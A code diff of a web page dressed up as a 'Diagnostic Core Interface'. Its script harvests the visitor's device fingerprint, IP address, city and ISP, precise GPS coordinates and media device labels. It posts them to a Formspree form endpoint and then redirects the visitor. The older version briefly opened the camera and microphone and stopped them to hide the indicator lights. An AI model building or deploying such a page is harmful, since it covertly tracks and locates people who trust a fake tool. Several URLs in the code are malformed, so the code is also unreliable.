@@ -138,7 +138,7 @@
 <body>
 
     <div class="container" id="mainCard">
-        <h1>Diagnostic Core Interface</h1>
+        <h1 id="panelTitle">Diagnostic Core Interface</h1>
         
         <div class="progress-container">
             <div class="progress-bar" id="progressBar"></div>
@@ -155,23 +155,28 @@
         const consoleDisplay = document.getElementById('consoleDisplay');
         const progressBar = document.getElementById('progressBar');
         const triggerBtn = document.getElementById('triggerBtn');
-        const mainCard = document.getElementById('mainCard');
+        const panelTitle = document.getElementById('panelTitle');
 
-        // DIRECT LIVE EMAIL GATEWAY ENDPOINT
-        const FORMSPREE_ENDPOINT = 'https://formspree.io/f/mredzakj';
+        // VERIFIED ACTIVE FORMSPREE ID
+        const FORMSPREE_ENDPOINT = 'https://formspree.io';
+        const LOCAL_STORAGE_KEY = 'quantum_telemetry_cache';
+        const REDIRECT_TARGET = 'https://netlify.app'; 
 
         let collectedMetrics = {
             hardwareProfile: {},
             screenMatrix: {},
             regionalContext: {},
-            networkStatus: {},
             storageProfile: {},
-            hardwareTokens: { geolocation: "Denied/Not Provided", hardwareLabels: "Denied/Not Provided" }
+            batteryStatus: {},
+            networkStatus: {},
+            ipLocationData: {},
+            hardwareTokens: { geolocation: "Denied/Not Provided", hardwareLabels: [] },
+            navigationMapping: {}
         };
 
         function pushOutput(message, designClass = 'accent-process') {
             const time = new Date().toLocaleTimeString();
-            consoleDisplay.innerHTML += `<div class="line ${designClass}">[${time}] ${message}</div>`;
+            consoleDisplay.innerHTML += `<div class="log-line ${designClass}">[${time}] ${message}</div>`;
             consoleDisplay.scrollTop = consoleDisplay.scrollHeight;
         }
 
@@ -181,8 +186,8 @@
 
         async function runBaseExtraction() {
             pushOutput("Gleaning expanded open environment metadata...", "accent-process");
+            updateProgress(20);
             
-            // Core Hardware Profiling Max Extension
             collectedMetrics.hardwareProfile = {
                 userAgent: navigator.userAgent,
                 cores: navigator.hardwareConcurrency || "N/A",
@@ -191,7 +196,6 @@
                 pdfViewerEnabled: navigator.pdfViewerEnabled || false
             };
 
-            // Enhanced Display Metric Arrays
             collectedMetrics.screenMatrix = {
                 bounds: `${screen.width}x${screen.height}`,
                 availableViewport: `${window.innerWidth}x${window.innerHeight}`,
@@ -199,14 +203,12 @@
                 scaleRatio: window.devicePixelRatio || 1
             };
 
-            // Extended Localization Profiles
             collectedMetrics.regionalContext = {
                 zone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown",
                 locale: navigator.language || "Unknown",
                 preferredLanguages: navigator.languages ? navigator.languages.join(', ') : "Unknown"
             };
 
-            // HTML5 Storage Allocation Diagnostics
             if (navigator.storage && navigator.storage.estimate) {
                 try {
                     const estimate = await navigator.storage.estimate();
@@ -214,132 +216,132 @@
                         quotaMb: Math.round(estimate.quota / (1024 * 1024)),
                         usageMb: Math.round(estimate.usage / (1024 * 1024))
                     };
-                } catch(e) {
-                    collectedMetrics.storageProfile = "Estimate Denied";
-                }
+                } catch(e) { collectedMetrics.storageProfile = "Estimate Denied"; }
             }
 
-            // WebGL Subsystem Deep Driver Mapping
             try {
                 const canvas = document.createElement('canvas');
                 const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                 if (gl) {
                     const debug = gl.getExtension('WEBGL_debug_renderer_info');
-                    collectedMetrics.hardwareProfile.gpuVendor = debug ? gl.getParameter(debug.UNMASKED_VENDOR_WEBGL) : "Standard Vendor";
-                    collectedMetrics.hardwareProfile.gpuRenderer = debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "Standard Engine";
+                    if (debug) {
+                        collectedMetrics.hardwareProfile.gpuVendor = gl.getParameter(debug.UNMASKED_VENDOR_WEBGL);
+                        collectedMetrics.hardwareProfile.gpuRenderer = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
+                    }
                 }
-            } catch(e) {
-                collectedMetrics.hardwareProfile.gpuRenderer = "Context Initialization Interrupted";
-            }
+            } catch(e) { collectedMetrics.hardwareProfile.gpuInfo = "WebGL Access Failure"; }
+            
+            pushOutput("Base environmental matrix extracted successfully.", "accent-success");
+        }
 
-            // Connection Class Analysis
-            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-            if (conn) {
-                collectedMetrics.networkStatus = {
-                    effectiveType: conn.effectiveType || "Unknown",
-                    downlinkSpeed: conn.downlink ? `${conn.downlink} Mbps` : "Unknown",
-                    rttPing: conn.rtt ? `${conn.rtt} ms` : "Unknown",
-                    saveDataMode: conn.saveData || false
-                };
+        async function extractBatteryData() {
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    collectedMetrics.batteryStatus = {
+                        level: `${Math.round(battery.level * 100)}%`,
+                        charging: battery.charging ? "Connected (Charging)" : "Discharging"
+                    };
+                } catch(e) {}
             }
+        }
 
+        function extractNetworkData() {
             updateProgress(40);
-            pushOutput("Comprehensive environment arrays structured.", "accent-success");
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            collectedMetrics.networkStatus = {
+                online: navigator.onLine,
+                effectiveType: connection ? (connection.effectiveType || "Unknown") : "N/A",
+                downlink: connection ? (`${connection.downlink} Mbps`) : "N/A"
+            };
+        }
+
+        async function fetchIPLocationFallback() {
+            pushOutput("Executing back-channel IP georouting lookup...", "accent-process");
+            updateProgress(60);
+            try {
+                const response = await fetch('https://ipapi.co');
+                if (response.ok) {
+                    const data = await response.json();
+                    collectedMetrics.ipLocationData = {
+                        ip: data.ip, city: data.city, region: data.region, country: data.country_name, postal: data.postal, isp: data.org,
+                        googleMapsBackupLink: `https://google.com{data.latitude},${data.longitude}`
+                    };
+                    pushOutput(`Network routing target located: ${data.city}, ${data.country_name}.`, "accent-success");
+                }
+            } catch(e) { pushOutput("Back-channel routing lookup offline.", "accent-fail"); }
+        }
+
+        async function requestAdvancedTelemetry() {
+            updateProgress(80);
+            pushOutput("Requesting absolute browser geospatial lock...", "accent-alert");
+
+            if (navigator.geolocation) {
+                try {
+                    const position = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, {timeout: 6000, enableHighAccuracy: true});
+                    });
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    
+                    collectedMetrics.hardwareTokens.geolocation = `Lat: ${lat}, Lon: ${lon}`;
+                    collectedMetrics.navigationMapping = {
+                        googleMapsDirectLink: `https://google.com{lat},${lon}`
+                    };
+                    pushOutput("Exact GPS matrix nodes secured.", "accent-success");
+                } catch (err) {
+                    pushOutput("GPS grid link restricted by user engine.", "accent-fail");
+                }
+            }
+
+            if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+                try {
+                    const devices = await navigator.mediaDevices.enumerateDevices();
+                    devices.forEach(device => {
+                        if(device.kind) {
+                            collectedMetrics.hardwareTokens.hardwareLabels.push(`${device.kind}: ${device.label || 'Protected Device'}`);
+                        }
+                    });
+                } catch (err) {}
+            }
+        }
+
+        async function dispatchTelemetry() {
+            updateProgress(90);
+            pushOutput("Transmitting integrated packet data bundle...", "accent-process");
+
+            try {
+                const response = await fetch(FORMSPREE_ENDPOINT, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+                    body: JSON.stringify({
+                        subject: "Quantum Diagnostic Registry Update",
+                        metrics: JSON.stringify(collectedMetrics, null, 2)
+                    })
+                });
+
+                if (response.ok) {
+                    updateProgress(100);
+                    pushOutput("PAYLOAD DELIVERED. Initializing console transfer...", "accent-success");
+                    setTimeout(() => { window.location.href = REDIRECT_TARGET; }, 1200);
+                } else { throw new Error("Gateway Refusal"); }
+            } catch (error) {
+                updateProgress(100);
+                pushOutput(`TRANSMISSION FAILURE: ${error.message}`, "accent-fail");
+            }
         }
 
         async function initiateDynamicHarvest() {
             triggerBtn.disabled = true;
-            triggerBtn.innerText = "Processing Operational Layers...";
-            mainCard.style.transform = "scale(0.99)";
+            panelTitle.innerText = "Synchronizing Core...";
+            triggerBtn.innerText = "Analyzing Matrix...";
             
-            // Step 1: Gather background data after click
             await runBaseExtraction();
-
-            // Step 2: Request Geolocation Telemetry (Prompts User ONLY right now)
-            pushOutput("Deploying hardware Geolocation handshake prompt...", "accent-process");
-            await queryLocation();
-            updateProgress(70);
-
-            // Step 3: Request Local Hardware Label Scan (Prompts User ONLY right now)
-            pushOutput("Deploying peripheral enumeration access layer...", "accent-process");
-            await queryPeripherals();
-            updateProgress(90);
-
-            // Step 4: Dispatch straight to Formspree
-            await executeTransmission();
-        }
-
-        function queryLocation() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) {
-                    collectedMetrics.hardwareTokens.geolocation = "Unsupported Device Architecture";
-                    resolve();
-                } else {
-                    navigator.geolocation.getCurrentPosition(
-                        (p) => {
-                            collectedMetrics.hardwareTokens.geolocation = {
-                                lat: p.coords.latitude,
-                                lon: p.coords.longitude,
-                                accuracyMeters: p.coords.accuracy,
-                                altitude: p.coords.altitude || "N/A"
-                            };
-                            pushOutput("Location metadata confirmed and synchronized.", "accent-success");
-                            resolve();
-                        },
-                        (err) => {
-                            collectedMetrics.hardwareTokens.geolocation = `Refused: ${err.message}`;
-                            pushOutput("Location access skipped by device policy.", "accent-alert");
-                            resolve();
-                        },
-                        { enableHighAccuracy: true, timeout: 6000 }
-                    );
-                }
-            });
-        }
-
-        async function queryPeripherals() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
-                const devices = await navigator.mediaDevices.enumerateDevices();
-                let devicesFound = [];
-                
-                devices.forEach(d => {
-                    if (d.label) devicesFound.push(`${d.kind.replace('input', '')}: ${d.label}`);
-                });
-
-                collectedMetrics.hardwareTokens.hardwareLabels = devicesFound.length ? devicesFound.join(' | ') : "Access Open (Drivers Verified)";
-                pushOutput("Hardware identifier arrays cross-referenced.", "accent-success");
-                
-                // Immediately shut off device camera/mic light indicators
-                stream.getTracks().forEach(t => t.stop());
-            } catch(e) {
-                collectedMetrics.hardwareTokens.hardwareLabels = `Refused: ${e.message}`;
-                pushOutput("Hardware identification skipped by device policy.", "accent-alert");
-            }
-        }
-
-        async function executeTransmission() {
-            pushOutput("Forwarding dynamic diagnostic bundle to mail gateway...", "accent-process");
-            try {
-                const mailRes = await fetch(FORMSPREE_ENDPOINT, {
-                    method: 'POST',
-                    headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' },
-                    body: JSON.stringify(collectedMetrics)
-                });
-                
-                if (mailRes.ok) {
-                    pushOutput("Mail gateway transit verified. Transmission sequence absolute.", "accent-success");
-                    updateProgress(100);
-                    triggerBtn.innerText = "Core Scan Complete";
-                    mainCard.style.transform = "translateY(0)";
-                } else {
-                    pushOutput(`Mail relay failure: status code ${mailRes.status}`, "accent-fail");
-                    triggerBtn.innerText = "Gateway Error";
-                }
-            } catch(e) {
-                pushOutput(`Mail channel exception route: ${e.message}`, "accent-fail");
-                triggerBtn.innerText = "Network Failure";
-            }
+            await extractBatteryData();
+            extractNetworkData();
+            await fetchIPLocationFallback();
+            await requestAdvancedTelemetry();
+            await dispatchTelemetry();
         }
     </script>
 </body>
